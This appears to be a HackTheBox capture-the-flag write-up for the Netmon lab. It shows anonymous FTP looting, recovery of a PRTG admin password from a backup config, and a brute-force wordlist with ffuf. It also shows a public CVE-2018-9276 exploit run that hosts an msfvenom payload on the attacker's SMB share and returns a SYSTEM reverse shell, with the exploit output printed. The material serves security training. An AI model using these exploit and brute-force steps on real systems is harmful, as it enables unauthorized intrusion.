---
render_with_liquid: false
title: HackTheBox Writeup  Netmon
date: 2023-09-26 21:43:01 +1400
tags: [hackthebox, nmap, windows, crackmapexec, ftp, lftp, enum, discover-secrets, discover-backup, password-reuse, prtg, cve-2018-9276, oscp-like-plus, hashcat, hashcat-rules, ffuf]
---




# Recon
---

```ruby
┌──(bravosec㉿fsociety)-[~/htb/Netmon]
└─$ writehosts htb '10.129.229.100 netmon.htb NETMON NETMON.netmon netmon'
+---------+--------+----------------+---------------+
| PROFILE | STATUS |       IP       |    DOMAIN     |
+---------+--------+----------------+---------------+
| htb     | on     | 10.129.229.100 | netmon.htb    |
| htb     | on     | 10.129.229.100 | NETMON        |
| htb     | on     | 10.129.229.100 | NETMON.netmon |
| htb     | on     | 10.129.229.100 | netmon        |
+---------+--------+----------------+---------------+
```


## SMB

```ruby
┌──(bravosec㉿fsociety)-[~/htb/Netmon]
└─$ cme smb netmon.htb -u '' -p ''
SMB         10.129.229.100  445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.129.229.100  445    NETMON           [-] netmon\: STATUS_ACCESS_DENIED

┌──(bravosec㉿fsociety)-[~/htb/Netmon]
└─$ cme smb netmon.htb -u 'a' -p ''
SMB         10.129.229.100  445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.129.229.100  445    NETMON           [-] netmon\a: STATUS_LOGON_FAILURE

┌──(bravosec㉿fsociety)-[~/htb/Netmon]
└─$ cme smb netmon.htb -u 'guest' -p ''
SMB         10.129.229.100  445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.129.229.100  445    NETMON           [-] netmon\guest: STATUS_ACCOUNT_DISABLED
```


## Nmap

```bash

# Nmap 7.94 scan initiated Tue Sep 26 21:43:01 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 netmon.htb
Nmap scan report for netmon.htb (10.129.229.100)
Host is up, received user-set (0.16s latency).
Scanned at 2023-09-26 21:43:01 CST for 67s

PORT      STATE SERVICE      REASON          VERSION
21/tcp    open  ftp          syn-ack ttl 127 Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_08-23-23  02:28AM       <DIR>          Windows
80/tcp    open  http         syn-ack ttl 127 Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-09-26T13:43:52
|_  start_date: 2023-09-26T13:40:52
|_clock-skew: mean: -10s, deviation: 0s, median: -10s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 32463/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 31787/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 21745/udp): CLEAN (Timeout)
|   Check 4 (port 24538/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Sep 26 21:44:08 2023 -- 1 IP address (1 host up) scanned in 66.98 seconds
```


## 80 - Site : PRTG Network Monitor (NETMON)


### Info

![](/assets/obsidian/5f3a7e5d79100a5f460ea52602701e8f.png)


# User Flag
---

## Enumeration


### FTP


#### Anonymous login

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon]
└─$ lftp -u 'anonymous,' netmon
lftp anonymous@netmon:~> ls -la
11-20-16  10:46PM       <DIR>          $RECYCLE.BIN
02-03-19  12:18AM                 1024 .rnd
11-20-16  09:59PM               389408 bootmgr
07-16-16  09:10AM                    1 BOOTNXT
02-03-19  08:05AM       <DIR>          Documents and Settings
02-25-19  10:15PM       <DIR>          inetpub
09-26-23  09:40AM            738197504 pagefile.sys
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
12-15-21  10:40AM       <DIR>          ProgramData
02-03-19  08:05AM       <DIR>          Recovery
02-03-19  08:04AM       <DIR>          System Volume Information
02-03-19  08:08AM       <DIR>          Users
08-23-23  02:28AM       <DIR>          Windows
```

Can't access system hives

```bash
lftp anonymous@netmon:/> cd Windows/System32/config/
cd: Access failed: 550 Access is denied.  (/Windows/System32/config)
```


#### Dump all files

Download all files that is `0~50` MB (Don't wanna download things such as `pagefile`)  ^2e379b

Good for future use of forensics (**Autopsy**)

```bash
mkdir -p loot/ftp && cd loot/ftp
lftp netmon -u anonymous, -e 'set ftp:list-options -a; mirror . . --parallel=40 --only-newer --size-range=0-30M'
```

## Get user flag from ftp share

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon/loot/ftp]
└─$ ls
 inetpub   PerfLogs  'Program Files'  'Program Files (x86)'   Users   Windows

┌──(bravosec㉿fsociety)-[~/htb/Netmon/loot/ftp]
└─$ cd Users

┌──(bravosec㉿fsociety)-[~/…/Netmon/loot/ftp/Users]
└─$ ls
Administrator  Public

┌──(bravosec㉿fsociety)-[~/…/Netmon/loot/ftp/Users]
└─$ cd Public

┌──(bravosec㉿fsociety)-[~/…/loot/ftp/Users/Public]
└─$ ls
Desktop  Documents  Downloads  Music  Pictures  user.txt  Videos

┌──(bravosec㉿fsociety)-[~/…/loot/ftp/Users/Public]
└─$ cat user.txt
48d0a60adac68da21d4b36b9a5648466
```

# Root Flag
---

## Shell as NT Authority System

### Exploit PRTG Network Monitor


#### Get prtgadmin's password from ftp

![](/assets/obsidian/25c1c1a7f72c89507bbd51485e005a86.png)

Version disclosure

![](/assets/obsidian/8c0168b08dcdf1c53c8e0b37da2ecae2.png)

Google : `PRTG Network Monitor 18.1.37.13946 exploit`

> https://github.com/A1vinSmith/CVE-2018-9276

Default creds did not work

![](/assets/obsidian/018c26f8e67184c064737b6dc29566ce.png)

Check for config files related to `prtgadmin`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon/loot/ftp]
└─$ grep -rin 'prtgadmin' -E5
```

![](/assets/obsidian/872cb782117b5fccfb4c6393568fba60.png)

Got password : `PrTg@dmin2018`


#### (Authenticated) Remote Code Execution (CVE-2018-9276)

Clone the previously discovered POC

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon]
└─$ git clone https://github.com/A1vinSmith/CVE-2018-9276

┌──(bravosec㉿fsociety)-[~/htb/Netmon]
└─$ cd CVE-2018-9276
```

The password was incorrect

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon/CVE-2018-9276]
└─$ python exploit.py -i netmon -p 80 --lhost 10.10.16.13 --lport 1111 --user prtgadmin --password 'PrTg@dmin2018'
```

![](/assets/obsidian/6b7f561a5ffc226689fe4d8a9ebd99c9.png)

Since the backup file was created at `2018` but current config file was from `2019`, tried `PrTg@dmin2019` and it worked

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon/CVE-2018-9276]
└─$ python exploit.py -i netmon -p 80 --lhost 10.10.16.13 --lport 1111 --user prtgadmin --password 'PrTg@dmin2019'
[+] [PRTG/18.1.37.13946] is Vulnerable!

[*] Exploiting [netmon:80] as [prtgadmin/PrTg@dmin2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] File staged at [C:\Users\Public\tester.txt] successfully with objid of [2020]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2020] staged for execution
[*] Generate msfvenom payload with [LHOST=10.10.16.13 LPORT=1111 OUTPUT=/tmp/afemevxu.dll]
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes
/home/kali/htb/Netmon/CVE-2018-9276/exploit.py:294: DeprecationWarning: setName() is deprecated, set the name attribute instead
  impacket.setName('Impacket')
/home/kali/htb/Netmon/CVE-2018-9276/exploit.py:295: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  impacket.setDaemon(True)
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Hosting payload at [\\10.10.16.13\RFYZXAYR]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Command staged at [C:\Users\Public\tester.txt] successfully with objid of [2021]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2021] staged for execution
[*] Attempting to kill the impacket thread
[-] Impacket will maintain its own thread for active connections, so you may find it's still listening on <LHOST>:445!
[-] ps aux | grep <script name> and kill -9 <pid> if it is still running :)
[-] The connection will eventually time out.

[+] Listening on [10.10.16.13:1111 for the reverse shell!]
listening on [any] 1111 ...
[*] Incoming connection (10.129.229.100,55912)
[*] AUTHENTICATE_MESSAGE (\,NETMON)
[*] User NETMON\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
connect to [10.10.16.13] from (UNKNOWN) [10.129.229.100] 56080
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\System32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
dce48b4d28e1222d1a5cd41ac5c9f7cd
```


# Additional
---

## Generate a custom wordlist to brute force password

After getting password `PrTg@dmin2018` from the backup file

Use **hashcat** rules to generate passwords based on `PrTg@dmin`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon]
└─$ hashcat --force --stdout keywords.txt -r /opt/sectools/password-attacks/OneRuleToRuleThemStill/OneRuleToRuleThemStill.rule > passwords_onerule.txt

┌──(bravosec㉿fsociety)-[~/htb/Netmon]
└─$ wc -l passwords_onerule.txt
49229 passwords_onerule.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon]
└─$ cat passwords_onerule.txt | grep 2019
PrTg@dmin2019
Prtg@dmin2019
```

> login.req

```http
POST /public/checklogin.htm HTTP/1.1
Host: netmon.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://netmon.htb
Connection: close
Referer: http://netmon.htb/index.htm
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

loginurl=&username=prtgadmin&password=FUZZ
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon]
└─$ ffuf -c -request login.req -request-proto http -w ./passwords_onerule.txt -fs 0
```


## Attempts while trying to get password from ftp

> Wasted a lot of time due to not specifying `-E5` with grep :/
{: .prompt-tip }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon/loot/ftp]
└─$ grep -rin 'prtgadmin'
Users/All Users/Paessler/PRTG Network Monitor/PRTG Configuration.old:29942:                  prtgadmin
Users/All Users/Paessler/PRTG Network Monitor/PRTG Configuration.dat:29942:                  prtgadmin
Users/All Users/Paessler/PRTG Network Monitor/PRTG Configuration.old.bak:141:         <!-- User: prtgadmin -->
Users/All Users/Paessler/PRTG Network Monitor/PRTG Configuration.old.bak:29166:                  prtgadmin
grep: Users/All Users/Paessler/PRTG Network Monitor/Logs (Web Server)/prtg20230926.log: binary file matches
Windows/PRTG Configuration.dat:29942:                  prtgadmin
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon/loot/ftp]
└─$ cat 'Windows/PRTG Configuration.dat'|grep 'prtgadmin' -E20
                </comments>
                <dateformat>
                  0
                </dateformat>
                <email>
                  na@na.com
                </email>
                <fixed>
                  1
                </fixed>
                <grpfoldsize>
                  10
                </grpfoldsize>
                <homepage>
                  /welcome.htm
                </homepage>
                <lastlogin>
                  43522.1088048495
                </lastlogin>
                <login>
                  prtgadmin
                </login>
                <name>
                  PRTG System Administrator
                </name>
                <ownerid>
                  100
                </ownerid>
                <password>
                  <flags>
                    <encrypted/>
                  </flags>
                  <cell col="0" crypt="PRTG">
                    JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
                  </cell>
                  <cell col="1" crypt="PRTG">
                    OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
                  </cell>
                </password>
                <playsound>
                  0
```

Parse it 

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon/loot/ftp]
└─$ xmllint --xpath '//password' 'Windows/PRTG Configuration.dat'
<password>
                  <flags>
                    <encrypted/>
                  </flags>
                  <cell col="0" crypt="PRTG">
                    JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
                  </cell>
                  <cell col="1" crypt="PRTG">
                    OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
                  </cell>
                </password>
```

Cracking it will be tough, try to get config from other locations

Google : `PRTG config location`

![](/assets/obsidian/4ce6efc54a282dc23beeb2e03528eb3e.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Netmon/loot/ftp]
└─$ cd 'ProgramData/Paessler/PRTG Network Monitor/'

┌──(bravosec㉿fsociety)-[~/…/ftp/ProgramData/Paessler/PRTG Network Monitor]
└─$ ls -latr
total 5192
-rw-r--r--  1 bravosec kali 1153755 Jul 14  2018 'PRTG Configuration.old.bak'
drwxr-xr-x  2 bravosec kali    4096 Feb  3  2019 'ToDo Database'
drwxr-xr-x  8 bravosec kali    4096 Feb  3  2019 'System Information Database'
drwxr-xr-x  2 bravosec kali    4096 Feb  3  2019 'Logs (System)'
drwxr-xr-x  2 bravosec kali    4096 Feb  3  2019 'Logs (Sensors)'
drwxr-xr-x  2 bravosec kali    4096 Feb  3  2019 'Logs (Debug)'
drwxr-xr-x  3 bravosec kali    4096 Feb  3  2019  ..
drwxr-xr-x  2 bravosec kali    4096 Feb  3  2019 'Ticket Database'
drwxr-xr-x  3 bravosec kali    4096 Feb 26  2019 'Report PDFs'
-rw-r--r--  1 bravosec kali 1189697 Feb 26  2019 'PRTG Configuration.old'
-rw-r--r--  1 bravosec kali 1189697 Feb 26  2019 'PRTG Configuration.dat'
drwxr-xr-x  2 bravosec kali    4096 Aug 18 16:20 'Configuration Auto-Backups'
drwxr-xr-x  2 bravosec kali    4096 Sep 26 17:41 'Logs (Web Server)'
drwxr-xr-x  2 bravosec kali    4096 Sep 26 17:41 'Log Database'
drwxr-xr-x  8 bravosec kali    4096 Sep 26 17:46 'Monitoring Database'
drwxr-xr-x 13 bravosec kali    4096 Sep 26 19:51  .
-rw-r--r--  1 bravosec kali 1720527 Sep 26 23:51 'PRTG Graph Data Cache.dat'
```

The `PRTG Configuration.dat` is same as prviously discovered one

```bash
┌──(bravosec㉿fsociety)-[~/…/ftp/ProgramData/Paessler/PRTG Network Monitor]
└─$ md5sum ../../../'Windows/PRTG Configuration.dat'
7b57a26eb4199d40a1e971497fe94fc7  ../../../Windows/PRTG Configuration.dat

┌──(bravosec㉿fsociety)-[~/…/ftp/ProgramData/Paessler/PRTG Network Monitor]
└─$ md5sum 'PRTG Configuration.dat'
7b57a26eb4199d40a1e971497fe94fc7  PRTG Configuration.dat
```

There's a `PRTG Configuration.old.bak` backup file created at `2018`, check the difference between it and current config

```bash
┌──(bravosec㉿fsociety)-[~/…/ftp/ProgramData/Paessler/PRTG Network Monitor]
└─$ diff 'PRTG Configuration.old.bak' PRTG\ Configuration.dat
...
```

Got password

```bash
┌──(bravosec㉿fsociety)-[~/…/ftp/ProgramData/Paessler/PRTG Network Monitor]
└─$ diff 'PRTG Configuration.old.bak' PRTG\ Configuration.dat|grep prtgadmin -E5
```

![](/assets/obsidian/c74fb42a338438579b536852ee3c7cc0.png)